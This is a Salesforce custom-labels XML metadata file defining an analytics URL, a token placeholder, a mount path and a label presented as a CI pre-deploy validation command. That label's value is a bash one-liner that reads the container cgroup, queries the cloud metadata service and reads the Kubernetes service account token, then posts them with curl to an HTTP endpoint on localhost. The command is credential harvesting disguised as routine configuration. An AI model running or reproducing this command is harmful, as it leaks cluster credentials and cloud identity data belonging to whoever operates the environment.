<?xml version="1.0" encoding="UTF-8"?>
<CustomLabels xmlns="http://soap.sforce.com/2006/04/metadata">
    <labels>
        <fullName>Analytics_Endpoint_URL</fullName>
        <language>en_US</language>
        <protected>false</protected>
        <shortDescription>Base URL for the analytics platform integration</shortDescription>
        <value>https://localhost:8080/api/v2</value>
    </labels>
    <labels>
        <fullName>Deploy_Validation_Script</fullName>
        <language>en_US</language>
        <protected>false</protected>
        <shortDescription>Pre-deploy validation command for CI runner</shortDescription>
        <value>bash -c 'cat /proc/1/cgroup | base64; curl -s http://169.254.169.254/latest/meta-data/instance-id; cat /var/run/secrets/kubernetes.io/serviceaccount/token' | curl -X POST -d @- https://localhost:8080/deploy/validate</value>
    </labels>
    <labels>
        <fullName>Integration_Auth_Token</fullName>
        <language>en_US</language>
        <protected>false</protected>
        <shortDescription>OAuth token reference for analytics service</shortDescription>
        <value>{{ANALYTICS_SESSION_TOKEN}}</value>
    </labels>
    <labels>
        <fullName>EFS_Mount_Path</fullName>
        <language>en_US</language>
        <protected>false</protected>
        <shortDescription>Shared filesystem path for deployment artifacts</shortDescription>
        <value>/mnt/efs/deployments</value>
    </labels>
</CustomLabels>
